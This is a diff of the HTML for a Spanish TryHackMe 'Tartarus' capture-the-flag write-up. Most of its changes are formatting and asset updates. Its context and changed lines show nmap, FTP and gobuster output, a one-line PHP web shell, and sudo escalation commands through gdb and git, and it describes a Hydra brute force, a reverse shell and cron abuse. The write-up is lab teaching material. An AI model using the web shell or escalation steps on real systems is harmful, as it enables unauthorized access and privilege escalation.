@@ -18,9 +18,9 @@
 
 <script defer src="/js/lazysizes.min.31dd6a2d3a1ec0f78a8df007535cf23f03aeb5c70f026e6d6a19dac3b3acc340.js"></script>
 
-<script defer src="/js/helper/getParents.min.ccd45f158c1b17849307ba913a72beac239c410f2b6e648496a79842da84e55b.js"></script>
+<script defer src="/js/helper/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>
 
-<script defer src="/js/helper/fadeinout.min.9fb19682560d5fa5596fffec85da605067c4acc86aad05add4d8fff9d362a446.js"></script>
+<script defer src="/js/helper/fadeinout.min.93a331f96194789a542f33690bbe4f0c102c7e78ffc018217f5a1c33010bad91.js"></script>
 
 <script defer src="/js/helper/closest.min.js"></script>
   
@@ -1257,7 +1257,7 @@
     <meta property="twitter:description" content="Tartarus es una maquina de TryHackMe, realizamos ataque de fuerza bruta con Hydra y un wordlist con credenciales encontradas, con ello subimos una webshell y ejecutamos una shell inversa. Tras ejecutar una shell con GDB cambiamos a un segundo usuario. Ejecutamos Git junto con Sudo para acceder a otro usuario. Finalmente modificamos un script utilizado por un CronJob para obtener acfeso privilegiado.">
   
 
-<meta name="generator" content="Hugo 0.92.0" />
+<meta name="generator" content="Hugo 0.68.3" />
 <meta name="msapplication-TileColor" content="#1d1d1d">
 
 <meta name="theme-color" content="#1d1d1d">
@@ -1605,10 +1605,10 @@
   <li><a href="https://sckull.github.io/tags/ftp/" class="single__tag" title="ftp">ftp</a></li>
   
 
-  <li><a href="https://sckull.github.io/tags/gdb/" class="single__tag" title="gdb">gdb</a></li>
+  <li><a href="https://sckull.github.io/tags/cron/" class="single__tag" title="cron">cron</a></li>
   
 
-  <li><a href="https://sckull.github.io/tags/cron/" class="single__tag" title="cron">cron</a></li>
+  <li><a href="https://sckull.github.io/tags/gdb/" class="single__tag" title="gdb">gdb</a></li>
   
 
 </ul>
@@ -1659,7 +1659,7 @@
 <p>Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), ssh (22) y el puerto http (80) abiertos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1673,7 +1673,7 @@
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Nmap 7.80 scan initiated Wed Aug 12 00:19:21 2020 as: nmap -sV -o mini_scan tartarus.thm</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Nmap 7.80 scan initiated Wed Aug 12 00:19:21 2020 as: nmap -sV -o mini_scan tartarus.thm</span>
 Nmap scan report <span class="k">for</span> tartarus.thm <span class="o">(</span>10.10.50.182<span class="o">)</span>
 Host is up <span class="o">(</span>0.25s latency<span class="o">)</span>.
 Not shown: <span class="m">997</span> closed ports
@@ -1691,7 +1691,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 <p>Ingresamos por el servicio FTP con las credenciales de anonymous (anonymous:anonymous), en donde encontramos dos archivos de texto el primero es posible verlo a simple vista, el segundo tenia un pequeño truco y es que las carpetas estaban con el nombre <code>...</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1753,7 +1753,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 </span><span class="lnt">60
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">root@upset:~/thm/tartarus# ftp tartarus.thm
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@upset:~/thm/tartarus# ftp tartarus.thm
 Connected to tartarus.thm.
 <span class="m">220</span> <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
 Name <span class="o">(</span>tartarus.thm:root<span class="o">)</span>: anonymous
@@ -1818,11 +1818,11 @@ root@upset:~/thm/tartarus#
 </div><h1 id="http">HTTP</h1>
 <p>Encontramos una pagina web de apache en el puerto 80.<br />
 <img src="/images/posts/thm/tartarus/Screenshot_20200811_232106.webp" alt="image" /></p>
-<h2 id="gobuster">GOBUSTER</h2>
+<h2 id="gobuster-">GOBUSTER</h2>
 <p>Utilizamos gobuster para busqueda de directorios y archivos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1830,7 +1830,7 @@ root@upset:~/thm/tartarus#
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">root@upset:~/thm/tartarus# gobuster dir -u http://tartarus.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t <span class="m">25</span> -x php,html,txt
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@upset:~/thm/tartarus# gobuster dir -u http://tartarus.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t <span class="m">25</span> -x php,html,txt
 /index.html <span class="o">(</span>Status: 200<span class="o">)</span>
 /index.html <span class="o">(</span>Status: 200<span class="o">)</span>
 /robots.txt <span class="o">(</span>Status: 200<span class="o">)</span>
@@ -1852,18 +1852,18 @@ root@upset:~/thm/tartarus#
 <img src="/images/posts/thm/tartarus/Screenshot_20200811_234545.webp" alt="image" /></p>
 <p>Al subir una imagen solo nos muestra el mensaje que se ha subido mas no la direccion donde esta se encuentra.<br />
 <img src="/images/posts/thm/tartarus/Screenshot_20200811_234732.webp" alt="image" /></p>
-<h3 id="gobuster-1">GOBUSTER</h3>
+<h3 id="gobuster--1">GOBUSTER</h3>
 <p>Utilizamos gobuster para busqueda de directorios y archivos, esta vez en el directorio nuevo.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">root@upset:~/thm/tartarus# gobuster dir -u http://tartarus.thm/sUp3r-s3cr3t/ -w /usr/share/wordlists/dirb/common.txt -q -t <span class="m">25</span> -x php,html,txt
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@upset:~/thm/tartarus# gobuster dir -u http://tartarus.thm/sUp3r-s3cr3t/ -w /usr/share/wordlists/dirb/common.txt -q -t <span class="m">25</span> -x php,html,txt
 /home.php <span class="o">(</span>Status: 302<span class="o">)</span>
 /images <span class="o">(</span>Status: 301<span class="o">)</span>
 /index.html <span class="o">(</span>Status: 200<span class="o">)</span>
@@ -1876,11 +1876,11 @@ root@upset:~/thm/tartarus#
 <p>Agregamos una shell a un archivo php y lo subimos, ejecutamos comandos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">echo</span> <span class="s2">&#34;&lt;pre&gt;&#34;</span><span class="p">;</span> <span class="nx">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="err">
-</span></code></pre></td></tr></table>
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="s2">&#34;&lt;pre&gt;&#34;</span><span class="p">;</span> <span class="nx">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+</code></pre></td></tr></table>
 </div>
 </div><p><img src="/images/posts/thm/tartarus/Screenshot_20200811_235811.webp" alt="image" /></p>
 <p>Ejecutamos una shell inversa y logramos obtener una shell con el usuario <code>www-data</code>.<br />
@@ -1893,10 +1893,10 @@ root@upset:~/thm/tartarus#
 <p>Ejecutamos el comando y logramos obtener una shell con este usario.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">sudo -u thirtytwo /var/www/gdb -nx -ex <span class="s1">&#39;!sh&#39;</span> -ex quit
+<pre class="chroma"><code class="language-bash" data-lang="bash">sudo -u thirtytwo /var/www/gdb -nx -ex <span class="s1">&#39;!sh&#39;</span> -ex quit
 </code></pre></td></tr></table>
 </div>
 </div><p><img src="/images/posts/thm/tartarus/Screenshot_20200812_000903.webp" alt="image" /></p>
@@ -1908,11 +1908,11 @@ root@upset:~/thm/tartarus#
 <p>Utilizamos <a href="https://gtfobins.github.io/gtfobins/git/#sudo"><strong>git</strong></a>. Ejecutamos el comando y logramos obtener una shell con el usuario d4rckh.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">sudo -u d4rckh /usr/bin/git -p <span class="nb">help</span> config
+<pre class="chroma"><code class="language-bash" data-lang="bash">sudo -u d4rckh /usr/bin/git -p <span class="nb">help</span> config
 <span class="c1">#!/bin/sh</span>
 </code></pre></td></tr></table>
 </div>
@@ -1922,7 +1922,7 @@ root@upset:~/thm/tartarus#
 <img src="/images/posts/thm/tartarus/Screenshot_20200812_002039.webp" alt="image" /></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1933,7 +1933,7 @@ root@upset:~/thm/tartarus#
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1">#cleanup.py</span>
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="c1">#cleanup.py</span>
 <span class="c1"># -*- coding: utf-8 -*-</span>
 <span class="c1">#!/usr/bin/env python</span>
 <span class="kn">import</span> <span class="nn">os</span>
@@ -2053,7 +2053,7 @@ root@upset:~/thm/tartarus#
     </div>
     <div class="whoami__desc">
       
-        Pentester wannabe
+        CTF Player | RedTeamer &amp; Pentester wannabe
       
     </div>
     <div class="whoami__social">
@@ -2239,7 +2239,7 @@ root@upset:~/thm/tartarus#
 </div>
 
 
-<script defer src="/js/swipe.min.d70095d96ef6a016133ea2c732c5d4713539d335b739178e356af46f54cf0a16.js"></script>
+<script defer src="/js/swipe.min.08ff2be1b74347bad9e267f732f1388d271b2f9d97b6a8a87bd6a510f17c5ad2.js"></script>
 
 <script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>
 
@@ -3355,10 +3355,10 @@ var a = document.getElementsByClassName('navbar__menu-item')
     <li><a href="#ftp">FTP</a></li>
     <li><a href="#http">HTTP</a>
       <ul>
-        <li><a href="#gobuster">GOBUSTER</a></li>
+        <li><a href="#gobuster-">GOBUSTER</a></li>
         <li><a href="#hydra">HYDRA</a>
           <ul>
-            <li><a href="#gobuster-1">GOBUSTER</a></li>
+            <li><a href="#gobuster--1">GOBUSTER</a></li>
           </ul>
         </li>
       </ul>
